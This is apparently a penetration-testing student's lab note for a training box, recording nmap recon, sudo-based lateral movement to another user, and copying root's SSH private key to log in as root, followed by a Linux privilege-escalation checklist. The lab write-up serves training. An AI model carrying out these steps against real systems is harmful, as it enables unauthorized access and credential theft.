---
title: box-note
type: note
permalink: oscp/templates/box-note-5
---

---
title: privesc
ip: 154.57.164.82
os: Linux
difficulty: Easy
platform: CPTS Lab
status: completed
created: 2026-08-12
tags: [box, cpts-lab, linux]
---

# privesc — 154.57.164.82

> **OS:** Linux · **Difficulty:** Easy · **Platform:** CPTS Lab · **Status:** #in-progress

---

## Recon
```bash
# nmap quick + full
nmap -Pn -sCV $ip
```
- Open ports: `31871`
- Notable services / versions: 
	- *ssh:* OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

#### IP
```
154.57.164.82
```

#### Port 
```
30756
```

## Enumeration
- `linpeas.sh`
	- user1 can run `bin/bash`
- Creds / usernames found: 
	- `user2`
	- `id_rsa` private key in `/root/.shh/id_rsa`

## Foothold / Initial Access
- Vulnerability: 
	- `user1` can run `/bin/bash` as any user so `sudo -u user2 /bin/bash` can be used for lateral movement

- Exploit / steps:
#### `ssh` into `user1` account
```bash
ssh user1@$ip -p $port
```

#### learn privileges of `user1`
```
sudo -l
```
- Found out that `user1` can execute /bin/bash
- use that to change users to `user2`

#### Gain access to `user2` account
```bash
sudo -u user2 /bin/bash
```
- Obtain the flag in the `user2` directory
- Look in `/root/.ssh/id_rsa`
- Copy the private key to local kali machine

#### Login with `id_rsa`
```bash
#paste the contents of root private key into local machine
nvim id_rsa
chmod 600 id_rsa
ssh root@$ip -p $port -i id_rsa
```
- obtain root flag from there

**Techniques:** 
- [[PEASS]]
- [[Nmap -sC and -sV (service + script scanning)]]

## Privilege Escalation

### Linux checklist
- [x] `sudo -l` — sudo rights
- [x] SUID/SGID (`find / -perm -4000 -type f 2>/dev/null`)
- [ ] Cron jobs / writable scripts
- [ ] Kernel version → known exploits
- [ ] Writable `/etc/passwd`, PATH hijack
- [ ] Capabilities (`getcap -r / 2>/dev/null`)
- [ ] Run **LinPEAS**

- Escalation path:
- **Technique:** [[]]

## Proof / Loot
- [ ] user.txt captured (screenshot w/ OSID)
- [ ] root/system proof captured (screenshot w/ OSID)
- Creds / hashes looted:
- Screenshots: `attachments/privesc/`

## Techniques used
- [[]]
- [[]]

## Lessons learned
- What slowed me down:
- What I'd do faster next time:---
title: Untitled
type: note
permalink: oscp/boxes/cpts-labs/untitled
---